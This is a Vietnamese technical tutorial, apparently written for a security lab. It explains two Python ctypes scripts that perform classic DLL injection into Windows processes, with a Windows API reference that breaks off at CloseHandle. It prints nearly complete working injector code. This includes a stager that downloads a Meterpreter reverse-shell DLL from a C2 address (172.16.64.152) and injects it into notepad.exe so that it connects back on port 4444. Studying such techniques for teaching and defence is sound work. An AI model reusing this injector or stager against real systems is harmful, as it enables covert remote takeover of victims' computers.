# Tài liệu kỹ thuật: Classic DLL Injection bằng Python

> Tài liệu này phân tích chi tiết hai kịch bản thực nghiệm Classic DLL Injection, dựa trên mã nguồn thực tế của hai file `inject.py` (Kịch bản 1) và `dll_injection.py` (Kịch bản 2).

---

## Phần chung: Nền tảng kỹ thuật dùng cho cả hai kịch bản

Cả hai file đều chia sẻ chung một bộ khung (framework) kỹ thuật cơ sở, bao gồm: thư viện, hằng số, cấu trúc dữ liệu, và khai báo Windows API. Phần này giải thích một lần duy nhất để tránh lặp lại.

### Import thư viện

```python
import os          # Xử lý đường dẫn tệp tin
import sys         # Thoát chương trình khi gặp lỗi
import ctypes      # Gọi trực tiếp hàm C trong DLL hệ thống Windows
from ctypes import wintypes  # Kiểu dữ liệu Windows: DWORD, BOOL, HANDLE...
```

- `ctypes` cho phép Python giao tiếp trực tiếp với các hàm cấp thấp trong `kernel32.dll` mà không cần viết mã C/C++.
- `wintypes` cung cấp các kiểu dữ liệu tương thích với Windows SDK (ví dụ: `DWORD` = số nguyên 32-bit không dấu).

> **Riêng Kịch bản 2** (`dll_injection.py`) bổ sung thêm `import urllib.request` để tải payload từ máy chủ C2 qua giao thức HTTP.

### Hằng số hệ thống

```python
PROCESS_ALL_ACCESS = 0x001FFFFF  # Toàn quyền truy cập tiến trình đích
MEM_COMMIT         = 0x00001000  # Cấp phát bộ nhớ vật lý (RAM) thực sự
MEM_RESERVE        = 0x00002000  # Đặt trước dải địa chỉ ảo
PAGE_READWRITE     = 0x04        # Quyền đọc + ghi (không cần quyền thực thi)
TH32CS_SNAPPROCESS = 0x00000002  # Chụp danh sách tiến trình đang chạy
```

| Hằng số | Vai trò trong chuỗi tấn công |
|---|---|
| `PROCESS_ALL_ACCESS` | Yêu cầu hệ điều hành cấp **toàn bộ quyền** (đọc/ghi bộ nhớ, tạo luồng, kết thúc tiến trình) khi mở tiến trình đích |
| `MEM_COMMIT \| MEM_RESERVE` | Kết hợp = `0x3000`: vừa đặt trước địa chỉ, vừa cấp RAM ngay lập tức trong một lệnh duy nhất |
| `PAGE_READWRITE` | Vùng nhớ chỉ chứa chuỗi đường dẫn (text), không phải shellcode → không cần quyền Execute |
| `TH32CS_SNAPPROCESS` | Truyền vào `CreateToolhelp32Snapshot` để quét toàn bộ tiến trình hệ thống |

### Cấu trúc PROCESSENTRY32W

```python
class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize",             wintypes.DWORD),        # Kích thước struct — BẮT BUỘC gán trước khi dùng
        ("cntUsage",           wintypes.DWORD),        # Không sử dụng
        ("th32ProcessID",      wintypes.DWORD),        # ← PID của tiến trình (giá trị cần lấy)
        ("th32DefaultHeapID",  ctypes.c_void_p),       # Heap ID
        ("th32ModuleID",       wintypes.DWORD),        # Không sử dụng
        ("cntThreads",         wintypes.DWORD),        # Số luồng
        ("th32ParentProcessID",wintypes.DWORD),        # PID tiến trình cha
        ("pcPriClassBase",     wintypes.LONG),         # Độ ưu tiên
        ("dwFlags",            wintypes.DWORD),        # Không sử dụng
        ("szExeFile",          wintypes.WCHAR * 260),  # ← Tên file .exe (Unicode)
    ]
```

Đây là bản ánh xạ 1:1 cấu trúc C `PROCESSENTRY32W` từ Windows SDK sang Python. Hai trường quan trọng nhất:
- `th32ProcessID`: Chứa PID — mã định danh duy nhất của mỗi tiến trình.
- `szExeFile`: Chứa tên file thực thi (ví dụ: `notepad.exe`, `mspaint.exe`).

> **Lưu ý:** Trước khi gọi `Process32FirstW`, **bắt buộc** phải gán `pe32.dwSize = ctypes.sizeof(PROCESSENTRY32W)`. Nếu thiếu, hàm sẽ trả về `False` và không trả kết quả.

### Khai báo Windows API

Mỗi hàm Windows API cần khai báo 2 thuộc tính:
- `restype`: Kiểu dữ liệu trả về
- `argtypes`: Danh sách kiểu các tham số đầu vào

Bảng tổng hợp các API được sử dụng:

| Hàm API | Chức năng | Kiểu trả về |
|---|---|---|
| `OpenProcess` | Mở kênh giao tiếp đến tiến trình đích, trả về handle | `c_void_p` (con trỏ) |
| `VirtualAllocEx` | Cấp phát vùng nhớ bên trong tiến trình đích | `c_void_p` (địa chỉ) |
| `WriteProcessMemory` | Ghi dữ liệu xuyên tiến trình vào vùng nhớ đã cấp phát | `BOOL` |
| `GetModuleHandleA` | Tìm địa chỉ cơ sở của module đã nạp (VD: `kernel32.dll`) | `c_void_p` |
| `GetProcAddress` | Tìm địa chỉ chính xác của một hàm trong module | `c_void_p` |
| `CreateRemoteThread` | Tạo luồng thực thi mới bên trong tiến trình đích | `c_void_p` (handle) |
| `CreateToolhelp32Snapshot` | Chụp ảnh nhanh danh sách tiến trình đang chạy | `c_void_p` |
| `Process32FirstW` / `NextW` | Duyệt tuần tự từng mục trong snapshot | `BOOL` |
| `WaitForSingleObject` | Chờ luồng hoàn tất thực thi | `DWORD` |
| `CloseHandle` | Giải phóng handle, tránh rò rỉ tài nguyên | `BOOL` |

### Hàm tìm PID theo tên tiến trình

```python
def get_pid_by_name(proc_name):
    # 1. Chụp snapshot toàn bộ tiến trình đang chạy
    hSnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

    # 2. Khởi tạo cấu trúc, gán kích thước bắt buộc
    pe32 = PROCESSENTRY32W()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32W)

    # 3. Duyệt từng tiến trình, so khớp tên (không phân biệt hoa/thường)
    if kernel32.Process32FirstW(hSnap, ctypes.byref(pe32)):
        while True:
            if pe32.szExeFile.lower() == proc_name.lower():
                pid = pe32.th32ProcessID
                kernel32.CloseHandle(hSnap)
                return pid
            if not kernel32.Process32NextW(hSnap, ctypes.byref(pe32)):
                break
    kernel32.CloseHandle(hSnap)
    return 0
```

Hàm hoạt động như một "Task Manager thu nhỏ": chụp danh sách tiến trình → duyệt tuần tự → so tên → trả PID khớp đầu tiên. Nếu không tìm thấy, trả về `0`.

---

# Kịch bản 1 — Tiêm DLL cục bộ (Local MessageBox)

**File:** `inject.py`

## 1.1. Mô tả tổng quan

Kịch bản 1 thực hiện Classic DLL Injection nhắm vào tiến trình `mspaint.exe` (Paint). Thư viện mã độc (`messagebox.dll`) đã nằm sẵn trên máy nạn nhân, được biên dịch từ file `messagebox_dll.cpp`. Khi injection thành công, hàm `DllMain()` bên trong DLL sẽ gọi `MessageBoxA()` hiển thị hộp thoại "Pwn!" trên giao diện Paint.

**Đặc điểm:**
- DLL nằm sẵn trên đĩa cục bộ → không cần kết nối mạng
- Payload đơn giản (MessageBox) → minh họa trực quan cơ chế injection
- Mục tiêu: `mspaint.exe` (ứng dụng Win32 thuần)

## 1.2. Phân tích luồng thực thi — 4 bước

### Bước 1: Định vị tiến trình mục tiêu và xác minh DLL

```python
# Tìm tiến trình Paint
target = "mspaint.exe"
pid = get_pid_by_name(target)
if not pid:
    print(f"[-] Không tìm thấy {target}!")
    sys.exit(1)
print(f"[+] Tìm thấy {target} - PID: {pid}")

# Kiểm tra file DLL có tồn tại trên đĩa không
dll_path = os.path.abspath("messagebox.dll")
if not os.path.exists(dll_path):
    print(f"[-] Không tìm thấy: {dll_path}")
    sys.exit(1)
dll_bytes = dll_path.encode('utf-8') + b'\x00'
```

**Giải thích:**
- Gọi `get_pid_by_name("mspaint.exe")` để quét hệ thống và trích xuất PID.
- `os.path.abspath()` chuyển đường dẫn tương đối thành tuyệt đối (VD: `C:\Users\Victim\Desktop\messagebox.dll`).
- `.encode('utf-8') + b'\x00'` chuyển chuỗi Python thành mảng byte kết thúc bằng ký tự null (`\x00`) — đây là yêu cầu bắt buộc của hàm `LoadLibraryA` (API ngôn ngữ C đọc chuỗi đến khi gặp `\x00`).

> **Điểm khác biệt so với Kịch bản 2:** Ở đây DLL đã có sẵn trên đĩa, chỉ cần kiểm tra `os.path.exists()`. Kịch bản 2 phải tải DLL qua mạng trước.

### Bước 2: Chiếm quyền tiến trình và cấp phát vùng nhớ

```python
# Mở kênh giao tiếp đến tiến trình đích
hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
if not hProcess:
    print(f"[-] OpenProcess thất bại. Lỗi: {kernel32.GetLastError()}")
    sys.exit(1)

# Tạo vùng nhớ trống bên trong tiến trình đích
addr = kernel32.VirtualAllocEx(
    hProcess, None, len(dll_bytes),
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
)
```

**Giải thích:**
- `OpenProcess(PROCESS_ALL_ACCESS, False, pid)`: Yêu cầu Windows cấp handle (tay nắm điều khiển) với toàn quyền truy cập vào tiến trình Paint. Tham số `False` = handle không được kế thừa bởi tiến trình con. **Yêu cầu quyền Administrator.**
- `VirtualAllocEx()`: Cấp phát một phân vùng nhớ ảo **bên trong không gian địa chỉ của Paint** (không phải của Injector). Phân vùng có kích thước vừa đủ chứa chuỗi đường dẫn DLL (~50 byte), với quyền đọc-ghi.

### Bước 3: Ghi đường dẫn DLL vào bộ nhớ tiến trình đích

```python
written = ctypes.c_size_t(0)
kernel32.WriteProcessMemory(
    hProcess, addr, dll_bytes,
    len(dll_bytes), ctypes.byref(written)
)
```

**Giải thích:**
- Sao chép chuỗi byte `dll_bytes` (chứa đường dẫn `C:\...\messagebox.dll\x00`) từ bộ nhớ của Injector sang vùng nhớ `addr` đã cấp phát bên trong Paint.
- Sau lệnh này, vùng nhớ tại `addr` trong Paint chứa: `C:\Users\Victim\Desktop\messagebox.dll\0`

### Bước 4: Phân giải LoadLibraryA và cưỡng ép nạp DLL

```python
# Tìm địa chỉ hàm LoadLibraryA trong kernel32.dll
h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
load_lib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

# Tạo luồng từ xa buộc Paint gọi LoadLibraryA
thread_id = wintypes.DWORD(0)
hThread = kernel32.CreateRemoteThread(
    ctypes.c_void_p(hProcess),     # Handle tiến trình Paint
    ctypes.c_void_p(0),            # NULL (không có security attributes)
    ctypes.c_size_t(0),            # Stack mặc định
    ctypes.c_void_p(load_lib),     # Hàm LoadLibraryA = điểm bắt đầu luồng
    ctypes.c_void_p(addr),         # Đường dẫn DLL = tham số của LoadLibraryA
    wintypes.DWORD(0),             # Chạy ngay (không suspend)
    ctypes.byref(thread_id)
)
```

**Giải thích:**
- `GetModuleHandleA("kernel32.dll")`: Tìm địa chỉ cơ sở của `kernel32.dll`. Thư viện này **luôn được nạp vào mọi tiến trình** Windows tại cùng một địa chỉ → địa chỉ hàm `LoadLibraryA` tìm được trong Injector cũng hợp lệ bên trong Paint.
- `GetProcAddress()`: Trích xuất địa chỉ chính xác trong bộ nhớ của hàm `LoadLibraryA`.
- `CreateRemoteThread()`: Ép Paint sinh ra một luồng mới. Luồng này thực thi lệnh `LoadLibraryA("C:\...\messagebox.dll")`. Windows nạp DLL → tự động gọi `DllMain()` → hiển thị MessageBox "Pwn!".

> **Lưu ý kỹ thuật:** Mỗi tham số được bọc thủ công (`ctypes.c_void_p(...)`) thay vì để ctypes tự ép kiểu. Điều này tránh lỗi cắt ngắn (truncation) giá trị handle 64-bit — nguyên nhân gây lỗi `ERROR_INVALID_HANDLE (6)` trên hệ thống 64-bit.

## 1.3. Lưu đồ thực thi

```
get_pid_by_name("mspaint.exe") ──→ pid
        │
        ▼
os.path.abspath("messagebox.dll") ──→ dll_path (xác minh tồn tại)
        │
        ▼
OpenProcess(PROCESS_ALL_ACCESS, pid) ──→ hProcess
        │
        ▼
VirtualAllocEx(hProcess, ...) ──→ addr (vùng nhớ trong Paint)
        │
        ▼
WriteProcessMemory(hProcess, addr, "C:\...\messagebox.dll\0")
        │
        ▼
GetModuleHandleA("kernel32.dll") → GetProcAddress("LoadLibraryA")
        │
        ▼
CreateRemoteThread(hProcess, LoadLibraryA, addr)
        │
        ▼
Paint gọi: LoadLibraryA("C:\...\messagebox.dll")
        │
        ▼
Windows nạp DLL → DllMain() → MessageBox("Pwn!") hiện trên Paint
```

---

# Kịch bản 2 — Tiêm DLL từ xa (Remote C2 Payload)

**File:** `dll_injection.py`

## 2.1. Mô tả tổng quan

Kịch bản 2 nâng cấp lên mô hình tấn công thực tế: **DLL mã độc không nằm sẵn trên máy nạn nhân** mà được lưu trữ trên máy chủ điều khiển (C2 Server). File `dll_injection.py` đóng vai trò là Stager (trình mồi nhử) — tải payload `test.dll` từ C2 qua HTTP, sau đó tiến hành injection vào tiến trình mục tiêu.

**Đặc điểm:**
- DLL mã độc (`test.dll`) được tạo bằng `msfvenom` → chứa Meterpreter Reverse TCP Shell
- Tải payload qua mạng bằng `urllib.request` → mô phỏng chuỗi tấn công APT thực tế
- Mục tiêu: `notepad.exe`
- Kết quả: Thiết lập phiên tương tác Meterpreter toàn quyền từ xa

## 2.2. Phân tích luồng thực thi — 4 bước

### Bước 1: Định vị mục tiêu và tải Payload từ máy chủ C2

```python
# Tìm tiến trình Notepad
target = "notepad.exe"
pid = get_pid_by_name(target)
if not pid:
    sys.exit(1)

# Tải DLL mã độc từ máy chủ tấn công qua HTTP
url = "http://172.16.64.152/test.dll"
urllib.request.urlretrieve(url, "test.dll")
dll_path = os.path.abspath("test.dll")
dll_bytes = dll_path.encode('utf-8') + b'\x00'
```

**Giải thích:**
- Quét hệ thống tìm `notepad.exe` giống Kịch bản 1.
- **Điểm khác biệt cốt lõi:** Thay vì đọc DLL có sẵn, module `urllib.request` thiết lập kết nối HTTP đến địa chỉ IP của C2 Server (`172.16.64.152`), tải về file `test.dll` và lưu vào thư mục hiện tại. File này thường chứa Meterpreter Reverse Shell — cho phép kẻ tấn công điều khiển máy nạn nhân từ xa.
- Đường dẫn tuyệt đối được chuyển thành byte null-terminated tương tự Kịch bản 1.

### Bước 2: Chiếm quyền tiến trình và cấp phát vùng nhớ

```python
hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
if not hProcess:
    sys.exit(1)

addr = kernel32.VirtualAllocEx(
    hProcess, None, len(dll_bytes),
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
)
```

**Giải thích:** Hoàn toàn tương tự Kịch bản 1 — mở handle đến Notepad với toàn quyền, tạo vùng nhớ trống bên trong Notepad để chứa đường dẫn DLL.

### Bước 3: Ghi đường dẫn DLL vào bộ nhớ Notepad

```python
written = ctypes.c_size_t(0)
kernel32.WriteProcessMemory(
    hProcess, addr, dll_bytes,
    len(dll_bytes), ctypes.byref(written)
)
```

**Giải thích:** Sao chép chuỗi `C:\...\test.dll\x00` từ Injector sang phân vùng `addr` trong Notepad.

### Bước 4: Cưỡng ép nạp DLL và kích hoạt Reverse Shell

```python
h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
load_lib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

thread_id = wintypes.DWORD(0)
hThread = kernel32.CreateRemoteThread(
    ctypes.c_void_p(hProcess),
    ctypes.c_void_p(0),
    ctypes.c_size_t(0),
    ctypes.c_void_p(load_lib),
    ctypes.c_void_p(addr),
    wintypes.DWORD(0),
    ctypes.byref(thread_id)
)
```

**Giải thích:**
- Cơ chế kỹ thuật hoàn toàn giống Kịch bản 1.
- **Khác biệt ở kết quả:** Khi `LoadLibraryA` nạp `test.dll`, hàm `DllMain()` bên trong không hiện MessageBox mà thay vào đó **mở kết nối TCP ngược** (Reverse Shell) về cổng `4444` trên C2 Server.
- Trạm lắng nghe Metasploit tiếp nhận kết nối → xác lập phiên Meterpreter → kẻ tấn công toàn quyền điều khiển máy nạn nhân.

## 2.3. Lưu đồ thực thi

```
get_pid_by_name("notepad.exe") ──→ pid
        │
        ▼
urllib.request.urlretrieve("http://C2/test.dll") ──→ Tải payload về đĩa
        │
        ▼
OpenProcess(PROCESS_ALL_ACCESS, pid) ──→ hProcess
        │
        ▼
VirtualAllocEx(hProcess, ...) ──→ addr (vùng nhớ trong Notepad)
        │
        ▼
WriteProcessMemory(hProcess, addr, "C:\...\test.dll\0")
        │
        ▼
GetModuleHandleA("kernel32.dll") → GetProcAddress("LoadLibraryA")
        │
        ▼
CreateRemoteThread(hProcess, LoadLibraryA, addr)
        │
        ▼
Notepad gọi: LoadLibraryA("C:\...\test.dll")
        │
        ▼
DllMain() → Reverse TCP Shell → Kết nối về C2:4444
        │
        ▼
Meterpreter Session Opened → Toàn quyền điều khiển từ xa
```

---

# So sánh hai kịch bản

| Tiêu chí | Kịch bản 1 (`inject.py`) | Kịch bản 2 (`dll_injection.py`) |
|---|---|---|
| **Nguồn DLL** | Nằm sẵn trên đĩa cục bộ (`messagebox.dll`) | Tải từ xa qua HTTP (`test.dll`) |
| **Payload** | MessageBox ("Pwn!") — vô hại, minh họa | Meterpreter Reverse Shell — nguy hiểm |
| **Tiến trình mục tiêu** | `mspaint.exe` | `notepad.exe` |
| **Kết nối mạng** | Không cần | Cần kết nối đến C2 Server |
| **Kết quả** | Hiện hộp thoại cảnh báo trên Paint | Toàn quyền điều khiển máy nạn nhân |
| **Mức độ mô phỏng** | Proof of Concept (PoC) | Mô phỏng tấn công APT thực tế |
| **Cơ chế injection** | Giống nhau: `OpenProcess` → `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread` |

---

# Lưu ý kỹ thuật quan trọng

1. **Tham số bọc thủ công cho `CreateRemoteThread`:** Mỗi tham số được ép kiểu rõ ràng bằng `ctypes.c_void_p(...)` thay vì để ctypes tự ép kiểu qua `argtypes`. Lý do: trên hệ thống 64-bit, cơ chế ép kiểu ngầm có thể cắt mất bit cao của handle → gây lỗi `ERROR_INVALID_HANDLE (6)`.

2. **Chuỗi null-terminated (`+ b'\x00'`):** Hàm `LoadLibraryA` là API ngôn ngữ C, đọc chuỗi cho đến khi gặp byte `\x00`. Nếu thiếu, hàm sẽ đọc tràn vùng nhớ → crash tiến trình.

3. **`PAGE_READWRITE` thay vì `PAGE_EXECUTE_READWRITE`:** Vùng nhớ chỉ chứa chuỗi text (đường dẫn DLL), không phải mã máy → không cần quyền Execute. Dùng `PAGE_EXECUTE_READWRITE` (`0x40`) không cần thiết sẽ bị các giải pháp bảo mật đánh dấu đáng ngờ.

4. **Yêu cầu quyền Administrator:** `OpenProcess(PROCESS_ALL_ACCESS, ...)` yêu cầu Injector chạy với quyền Admin. Nếu thiếu, Windows từ chối cấp handle.

5. **`dwSize` phải gán trước khi duyệt tiến trình:** `pe32.dwSize = ctypes.sizeof(PROCESSENTRY32W)` là yêu cầu bắt buộc của API. Thiếu dòng này → `Process32FirstW` trả về `False`, không duyệt được.

6. **`CloseHandle()` bắt buộc:** Handle chiếm tài nguyên kernel. Không giải phóng sẽ gây rò rỉ handle (handle leak) — tích lũy qua nhiều lần chạy có thể cạn tài nguyên hệ thống.

7. **Không phải mọi tiến trình đều inject được:** Các ứng dụng UWP/Store (Notepad trên Windows 11), Protected Process, và tiến trình SYSTEM-level (`svchost.exe`) có cơ chế bảo vệ cấp kernel (CIG, CFG) chặn `CreateRemoteThread`. Nên chọn tiến trình Win32 thuần hoặc thử nghiệm trên Windows 10.

---

# Tra cứu các hàm Windows API (theo tài liệu Microsoft)

Phần này liệt kê chi tiết từng hàm Windows API được sử dụng trong cả hai kịch bản, dựa theo tài liệu chính thức trên [Microsoft Learn](https://learn.microsoft.com).

---

## 1. OpenProcess

**Tham chiếu:** [Microsoft Docs — OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)

```c
HANDLE OpenProcess(
  DWORD dwDesiredAccess,  // Quyền truy cập yêu cầu
  BOOL  bInheritHandle,   // Handle có được kế thừa không
  DWORD dwProcessId       // PID tiến trình cần mở
);
```

| Tham số | Giá trị trong code | Giải thích |
|---|---|---|
| `dwDesiredAccess` | `PROCESS_ALL_ACCESS` (`0x1FFFFF`) | Tổ hợp **tất cả các quyền**: đọc/ghi bộ nhớ, tạo luồng, truy vấn thông tin, kết thúc tiến trình |
| `bInheritHandle` | `False` | Handle không được kế thừa bởi tiến trình con |
| `dwProcessId` | `pid` (từ `get_pid_by_name`) | PID của tiến trình đích |
| **Trả về** | Handle hợp lệ hoặc `NULL` | `NULL` = thất bại (thiếu quyền Admin hoặc PID không tồn tại) |

**Vai trò:** Thiết lập "kênh giao tiếp" từ Injector đến tiến trình nạn nhân. Không có handle này, không thể thao tác bộ nhớ tiến trình đích.

---

## 2. VirtualAllocEx

**Tham chiếu:** [Microsoft Docs — VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)

```c
LPVOID VirtualAllocEx(
  HANDLE hProcess,         // Handle tiến trình đích
  LPVOID lpAddress,        // Địa chỉ bắt đầu (NULL = OS tự chọn)
  SIZE_T dwSize,           // Kích thước cần cấp phát (byte)
  DWORD  flAllocationType, // Kiểu cấp phát
  DWORD  flProtect         // Quyền bảo vệ vùng nhớ
);
```

| Tham số | Giá trị trong code | Giải thích |
|---|---|---|
| `hProcess` | Handle từ `OpenProcess` | Tiến trình sẽ được cấp phát bộ nhớ |
| `lpAddress` | `None` | Để hệ điều hành tự chọn địa chỉ phù hợp |
| `dwSize` | `len(dll_bytes)` (~50 byte) | Vừa đủ chứa chuỗi đường dẫn DLL |
| `flAllocationType` | `MEM_COMMIT \| MEM_RESERVE` (`0x3000`) | Đặt trước dải địa chỉ **và** cấp RAM ngay lập tức |
| `flProtect` | `PAGE_READWRITE` (`0x04`) | Quyền đọc + ghi (không cần Execute vì chỉ lưu chuỗi text) |
| **Trả về** | Địa chỉ cơ sở hoặc `NULL` | Địa chỉ vùng nhớ đã cấp phát bên trong tiến trình đích |

**Vai trò:** Tạo "khoang chứa" trống bên trong không gian bộ nhớ của tiến trình nạn nhân để ghi chuỗi đường dẫn DLL vào.

---

## 3. WriteProcessMemory

**Tham chiếu:** [Microsoft Docs — WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

```c
BOOL WriteProcessMemory(
  HANDLE  hProcess,               // Handle tiến trình đích
  LPVOID  lpBaseAddress,          // Địa chỉ đích trong tiến trình
  LPCVOID lpBuffer,               // Con trỏ dữ liệu nguồn
  SIZE_T  nSize,                  // Số byte cần ghi
  SIZE_T  *lpNumberOfBytesWritten // Con trỏ nhận số byte đã ghi thực tế
);
```

| Tham số | Giá trị trong code | Giải thích |
|---|---|---|
| `hProcess` | Handle tiến trình đích | Xác định tiến trình sẽ bị ghi dữ liệu |
| `lpBaseAddress` | `addr` (từ `VirtualAllocEx`) | Vùng nhớ đích đã cấp phát |
| `lpBuffer` | `dll_bytes` | Mảng byte chứa đường dẫn DLL (null-terminated) |
| `nSize` | `len(dll_bytes)` | Số byte cần sao chép |
| `lpNumberOfBytesWritten` | `ctypes.byref(written)` | Nhận số byte đã ghi thành công (dùng để xác minh) |
| **Trả về** | `TRUE` / `FALSE` | Kết quả thao tác ghi |

**Vai trò:** Ghi dữ liệu **xuyên ranh giới tiến trình** — sao chép chuỗi đường dẫn DLL từ bộ nhớ Injector sang vùng nhớ đã cấp phát bên trong tiến trình nạn nhân.

---

## 4. GetModuleHandleA

**Tham chiếu:** [Microsoft Docs — GetModuleHandleA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)

```c
HMODULE GetModuleHandleA(
  LPCSTR lpModuleName  // Tên module cần tìm (chuỗi ANSI)
);
```

| Tham số | Giá trị trong code | Giải thích |
|---|---|---|
| `lpModuleName` | `b"kernel32.dll"` | Tìm thư viện lõi `kernel32.dll` |
| **Trả về** | Handle (địa chỉ cơ sở) hoặc `NULL` | Địa chỉ cơ sở nạp của module trong bộ nhớ |

**Vai trò:** Tìm địa chỉ cơ sở nạp (base address) của `kernel32.dll`. Đây là bước chuẩn bị để trích xuất vị trí hàm `LoadLibraryA`.

> **Nguyên lý khai thác:** `kernel32.dll` là thư viện hệ thống lõi, **luôn được Windows nạp vào mọi tiến trình** tại cùng một địa chỉ cơ sở. Do đó, địa chỉ hàm tìm được trong Injector cũng hợp lệ bên trong tiến trình đích.

---

## 5. GetProcAddress

**Tham chiếu:** [Microsoft Docs — GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)

```c
FARPROC GetProcAddress(
  HMODULE hModule,     // Handle module (từ GetModuleHandleA)
  LPCSTR  lpProcName   // Tên hàm cần tìm (chuỗi ANSI)
);
```

| Tham số | Giá trị trong code | Giải thích |
|---|---|---|
| `hModule` | `h_kernel32` | Handle của `kernel32.dll` từ bước trước |
| `lpProcName` | `b"LoadLibraryA"` | Tên hàm cần trích xuất địa chỉ |
| **Trả về** | Địa chỉ hàm hoặc `NULL` | Tọa độ bộ nhớ chính xác của hàm `LoadLibraryA` |

**Vai trò:** Trích xuất địa chỉ chính xác của hàm `LoadLibraryA` trong bộ nhớ. Địa chỉ này sẽ được truyền vào `CreateRemoteThread` như điểm khởi đầu (entry point) của luồng thực thi từ xa.

---

## 6. CreateRemoteThread

**Tham chiếu:** [Microsoft Docs — CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

```c
HANDLE CreateRemoteThread(
  HANDLE                 hProcess,           // Handle tiến trình đích
  LPSECURITY_ATTRIBUTES  lpThreadAttributes, // Thuộc tính bảo mật (NULL)
  SIZE_T                 dwStackSize,        // Kích thước stack (0 = mặc định)
  LPTHREAD_START_ROUTINE lpStartAddress,     // Địa chỉ hàm sẽ thực thi
  LPVOID                 lpParameter,        // Tham số truyền cho hàm
  DWORD                  dwCreationFlags,    // Cờ tạo luồng (0 = chạy ngay)
  LPDWORD                lpThreadId          // Con trỏ nhận Thread ID
);
```

| Tham số | Giá trị trong code | Giải thích |
|---|---|---|
| `hProcess` | `ctypes.c_void_p(hProcess)` | Handle tiến trình nạn nhân |
| `lpThreadAttributes` | `ctypes.c_void_p(0)` (`NULL`) | Sử dụng bảo mật mặc định |
| `dwStackSize` | `ctypes.c_size_t(0)` | Hệ thống tự cấp stack mặc định |
| `lpStartAddress` | `ctypes.c_void_p(load_lib)` | **Địa chỉ `LoadLibraryA`** — luồng mới bắt đầu từ hàm này |
| `lpParameter` | `ctypes.c_void_p(addr)` | **Địa chỉ chứa đường dẫn DLL** — tham số cho `LoadLibraryA` |
| `dwCreationFlags` | `wintypes.DWORD(0)` | Luồng chạy ngay lập tức (không suspend) |
| `lpThreadId` | `ctypes.byref(thread_id)` | Nhận Thread ID của luồng mới |
| **Trả về** | Handle luồng hoặc `NULL` | `NULL` = thất bại |

**Vai trò:** Đây là **hàm quyết định** của toàn bộ chuỗi tấn công. Ép tiến trình nạn nhân sinh ra luồng mới thực thi lệnh tương đương:
```c
LoadLibraryA("C:\\...\\test.dll");
```
Khi `LoadLibraryA` được gọi, Windows Loader tự động nạp DLL và kích hoạt `DllMain()` — nơi chứa mã độc.

---

## 7. CreateToolhelp32Snapshot

**Tham chiếu:** [Microsoft Docs — CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)

```c
HANDLE CreateToolhelp32Snapshot(
  DWORD dwFlags,        // Loại dữ liệu cần chụp
  DWORD th32ProcessID   // PID tiến trình (0 = toàn bộ hệ thống)
);
```

| Tham số | Giá trị trong code | Giải thích |
|---|---|---|
| `dwFlags` | `TH32CS_SNAPPROCESS` (`0x02`) | Chụp danh sách **tất cả tiến trình** đang chạy |
| `th32ProcessID` | `0` | Bao gồm mọi tiến trình trên hệ thống |
| **Trả về** | Handle snapshot | Dùng cho `Process32FirstW` / `Process32NextW` |

**Vai trò:** Tạo "ảnh chụp nhanh" (snapshot) toàn bộ tiến trình đang chạy trên hệ thống, chuẩn bị cho việc duyệt tìm PID mục tiêu.

---

## 8. Process32FirstW / Process32NextW

**Tham chiếu:** [Microsoft Docs — Process32FirstW](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32firstw)

```c
BOOL Process32FirstW(
  HANDLE            hSnapshot,  // Handle snapshot
  LPPROCESSENTRY32W lppe        // Con trỏ cấu trúc nhận dữ liệu
);

BOOL Process32NextW(
  HANDLE            hSnapshot,
  LPPROCESSENTRY32W lppe
);
```

| Hàm | Chức năng |
|---|---|
| `Process32FirstW` | Đọc **mục đầu tiên** trong danh sách tiến trình từ snapshot |
| `Process32NextW` | Chuyển sang **mục tiếp theo**. Trả về `FALSE` khi hết danh sách |

**Vai trò:** Duyệt tuần tự từng tiến trình trong snapshot, so khớp trường `szExeFile` (tên file .exe) với tên mục tiêu để trích xuất PID.

> **Lưu ý:** Trước khi gọi `Process32FirstW`, trường `dwSize` trong cấu trúc `PROCESSENTRY32W` **bắt buộc** phải được gán giá trị `ctypes.sizeof(PROCESSENTRY32W)`. Đây là yêu cầu ghi trong tài liệu Microsoft.

---

## 9. WaitForSingleObject

**Tham chiếu:** [Microsoft Docs — WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)

```c
DWORD WaitForSingleObject(
  HANDLE hHandle,         // Handle đối tượng cần chờ
  DWORD  dwMilliseconds   // Thời gian chờ tối đa (ms)
);
```

| Tham số | Giá trị trong code | Giải thích |
|---|---|---|
| `hHandle` | `hThread` (từ `CreateRemoteThread`) | Handle luồng từ xa cần chờ |
| `dwMilliseconds` | `5000` | Chờ tối đa 5 giây để luồng hoàn tất |

**Vai trò:** Đảm bảo DLL được nạp xong trước khi Injector đóng handle và thoát. Nếu không chờ, Injector có thể giải phóng tài nguyên trước khi luồng kịp hoàn thành → DLL không được nạp.

---

## 10. CloseHandle

**Tham chiếu:** [Microsoft Docs — CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)

```c
BOOL CloseHandle(
